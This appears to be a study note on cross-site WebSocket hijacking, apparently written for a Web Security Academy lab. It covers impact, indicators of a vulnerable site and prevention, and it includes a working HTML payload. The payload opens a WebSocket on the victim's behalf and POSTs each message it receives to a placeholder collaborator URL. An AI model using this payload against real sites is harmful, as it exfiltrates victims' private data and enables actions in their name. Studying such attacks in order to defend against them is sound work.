This is similar to HTTP CSRF, where a malicious server can be hosted to create a Websocket to a vulnerable site on the victim's behalf, and even execute privileged actions

# Even worse
Websockets enable the attacker to gain access to a dual channel - They can send data to the client or the server, on behalf of the other.


# IMPACT
1. Perform privileged actions on behalf of the victim.
2. Retrieve sensitive information

# Indicators of Vulnerability
1. Relies solely on an HTTP cookie to validate the session -> no unpredictable tokens being used.
2. Similar indicators to regular CSRF on the HTTP request that initiates the WebSocket
Example of a vulnerable site:
```
GET /chat HTTP/1.1 
Host: normal-website.com 
Sec-WebSocket-Version: 13 
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
Connection: keep-alive, Upgrade 
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2         -> only the session cookie
Upgrade: websocket

```

## Possible Payload
```HTML
<script>
var ws = new Websocket("wss://0add00d803f9f3158065715a00990008.web-security-academy.net/chat");
ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

# PREVENTION
- Use the `wss://` protocol (WebSockets over TLS).
- Hard code the URL of the WebSockets endpoint, and don't incorporate user-controllable data into this URL.
- Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
- Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.
